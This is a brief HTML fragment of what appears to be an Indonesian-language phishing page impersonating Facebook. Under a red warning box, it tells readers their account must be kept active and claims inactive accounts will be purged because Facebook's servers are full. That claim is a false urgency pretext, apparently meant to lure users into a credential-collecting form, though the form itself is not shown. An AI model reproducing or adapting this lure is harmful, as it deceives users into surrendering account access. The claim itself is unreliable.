...
<body>
	...
	<section>
		<div class="form">
			<div class="m-header">
				<h3>Jaga Agar Akun Anda Tetap Aktif</h3>
			</div>
			<div class="red-box">
				<p style="font-weight:bold; font-size:13px">Apakah Akun Anda Aktif?</p>
				<p>Kami Akan Melakukan <b>Pembersihan Akun Nonaktif</b> Dikarenakan Server Facebook Penuh</p>
